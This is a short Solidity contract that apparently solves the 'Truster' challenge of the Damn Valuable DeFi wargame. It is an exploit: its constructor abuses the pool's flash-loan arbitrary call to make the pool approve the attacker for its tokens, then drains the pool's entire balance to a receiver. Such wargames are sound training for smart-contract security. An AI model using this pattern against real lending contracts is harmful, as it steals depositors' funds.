// SPDX-License-Identifier: MIT 
pragma solidity =0.8.25;
import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {DamnValuableToken, ERC20} from "../DamnValuableToken.sol";

contract TrusterLenderPoolHack{

    TrusterLenderPool pool;
    DamnValuableToken token;

    constructor(address _pool, address receiver){
        pool = TrusterLenderPool(_pool);
        token = DamnValuableToken(pool.token());

        bytes memory data = abi.encodeWithSelector(ERC20.approve.selector, address(this), type(uint256).max);
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), receiver, token.balanceOf(address(pool)));
    }
    
}